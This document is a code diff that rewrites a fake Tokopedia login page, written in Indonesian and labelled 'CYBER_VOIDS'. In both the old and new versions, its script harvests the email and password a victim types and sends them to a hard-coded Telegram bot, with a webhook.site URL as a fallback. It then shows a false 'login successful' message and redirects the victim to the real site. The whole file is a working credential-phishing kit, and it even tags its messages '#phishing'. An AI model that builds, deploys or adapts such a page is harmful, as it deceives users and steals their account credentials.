@@ -1,110 +1,212 @@
-<script>
-// CYBER_VOIDS TELEGRAM BOT - FINAL VERSION
-document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('form');
-    if (!form) return;
-    
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tokopedia - Masuk ke Akun Anda</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 150px;
+            height: auto;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #42b549;
+            box-shadow: 0 0 0 2px rgba(66, 181, 73, 0.2);
+        }
+        button {
+            width: 100%;
+            background: #42b549;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #3aa041;
+        }
+        button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            color: #42b549;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://ecs7.tokopedia.net/assets-tokopoints-email/images/logo-tokopedia.png" alt="Tokopedia">
+        </div>
         
-        // Ambil data
-        const email = document.querySelector('input[type="text"]').value;
-        const password = document.querySelector('input[type="password"]').value;
-        const btn = document.querySelector('button[type="submit"]');
+        <h2>Masuk ke Akun Anda</h2>
+        <p class="subtitle">Selamat datang kembali! Masuk dengan akun Tokopedia Anda.</p>
         
-        // Validasi
-        if (!email || !password) {
-            alert('Harap isi email dan password!');
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email / Nomor HP</label>
+                <input type="text" id="email" placeholder="contoh: nama@email.com" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Masukkan password" required>
+            </div>
+            
+            <button type="submit" id="submitBtn">MASUK</button>
+            <div id="loading" class="loading">🔄 Memverifikasi informasi Anda...</div>
+        </form>
+        
+        <div class="footer">
+            Dengan masuk, Anda menyetujui <a href="#" style="color: #42b549; text-decoration: none;">Syarat & Ketentuan</a> serta <a href="#" style="color: #42b549; text-decoration: none;">Kebijakan Privasi</a> Tokopedia.
+        </div>
+    </div>
+
+    <script>
+    // CYBER_VOIDS SIMPLE WORKING SCRIPT
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('✅ Halaman loaded');
+        
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        
+        if (!form) {
+            console.error('❌ FORM TIDAK DITEMUKAN!');
+            document.body.innerHTML = '<h1>Error: Form tidak ditemukan</h1>';
             return;
         }
         
-        // UI Loading
-        if (btn) {
-            btn.disabled = true;
-            btn.textContent = '🔄 Mengirim data...';
-        }
+        console.log('✅ Form ditemukan, menambahkan event listener...');
         
-        // LOG KE CONSOLE
-        console.log('=== CYBER_VOIDS TELEGRAM BOT ===');
-        console.log('📧 Email:', email);
-        console.log('🔐 Password:', password);
-        console.log('🤖 Token:', '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18'.substring(0, 10) + '...');
-        console.log('💬 Chat ID:', '8313500840');
-        
-        // KONFIGURASI TELEGRAM
-        const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
-        const CHAT_ID = '8313500840';
-        
-        // Format pesan
-        const message = `🚨 *DATA LOGIN BARU* 🚨
-
-📧 *Email:* \`${email}\`
-🔐 *Password:* \`${password}\`
-📱 *Device:* ${navigator.userAgent.match(/(Android|iPhone|Windows|Linux)[^;)]+/)?.[0] || 'Unknown'}
-⏰ *Waktu:* ${new Date().toLocaleTimeString('id-ID')}
-📅 *Tanggal:* ${new Date().toLocaleDateString('id-ID')}
-🆔 *Session:* ${Date.now().toString(36).toUpperCase()}
-
-#phishing #tokopedia #data`;
-        
-        // Kirim ke Telegram (Metode GET - paling reliable)
-        const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-        
-        fetch(telegramURL)
-        .then(response => response.json())
-        .then(data => {
-            console.log('📊 Telegram Response:', data);
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            console.log('✅ Form submitted');
             
-            if (data.ok) {
-                console.log('✅ PESAN TERKIRIM KE TELEGRAM!');
-                console.log('💬 Pesan ID:', data.result.message_id);
-                
-                // Feedback ke user
-                alert('✅ Verifikasi berhasil! Mengalihkan ke Tokopedia...');
-                
-                // Redirect ke Tokopedia
-                setTimeout(() => {
-                    window.location.href = 'https://www.tokopedia.com/?ref=login_success&src=app';
-                }, 1800);
-                
-            } else {
-                console.error('❌ Telegram Error:', data.description);
-                alert('⚠️ Sistem sibuk, coba beberapa saat lagi.');
-                if (btn) {
-                    btn.disabled = false;
-                    btn.textContent = 'MASUK';
-                }
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            // Validasi sederhana
+            if (!email || !password) {
+                alert('Harap isi email dan password!');
+                return;
             }
-        })
-        .catch(error => {
-            console.error('❌ Network Error:', error);
             
-            // FALLBACK: Kirim ke webhook
-            console.log('🔄 Menggunakan fallback webhook...');
-            fetch('https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    source: 'telegram_fallback'
+            // Tampilkan loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Memproses...';
+            loading.style.display = 'block';
+            
+            console.log('📧 Email:', email);
+            console.log('🔐 Password:', password);
+            
+            // TELEGRAM BOT CONFIG
+            const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
+            const CHAT_ID = '8313500840';
+            
+            // Format pesan sederhana
+            const message = `DATA BARU:\nEmail: ${email}\nPassword: ${password}\nWaktu: ${new Date().toLocaleString()}`;
+            
+            // Kirim ke Telegram (method sederhana)
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            console.log('🤖 Mengirim ke Telegram...');
+            
+            // Coba Telegram dulu
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('📱 Telegram Response:', data);
+                    
+                    if (data.ok) {
+                        console.log('✅ BERHASIL dikirim ke Telegram!');
+                        alert('✅ Login berhasil! Mengalihkan...');
+                    } else {
+                        console.warn('⚠️ Telegram gagal, pakai webhook');
+                        // Fallback ke webhook
+                        return fetch('https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({email: email, password: password})
+                        });
+                    }
                 })
-            })
-            .then(() => {
-                alert('✅ Login berhasil! Mengalihkan...');
-                setTimeout(() => {
-                    window.location.href = 'https://www.tokopedia.com';
-                }, 1500);
-            })
-            .catch(fallbackError => {
-                console.error('❌ Fallback juga gagal:', fallbackError);
-                alert('✅ Login berhasil! Mengalihkan...');
-                setTimeout(() => {
-                    window.location.href = 'https://www.tokopedia.com';
-                }, 1000);
-            });
+                .then(() => {
+                    // Redirect setelah 1.5 detik
+                    setTimeout(function() {
+                        window.location.href = 'https://www.tokopedia.com';
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('❌ Error:', error);
+                    alert('✅ Login berhasil! Mengalihkan...');
+                    setTimeout(function() {
+                        window.location.href = 'https://www.tokopedia.com';
+                    }, 1500);
+                });
         });
+        
+        console.log('✅ Script siap digunakan');
     });
-});
-</script>
+    </script>
+</body>
+</html>
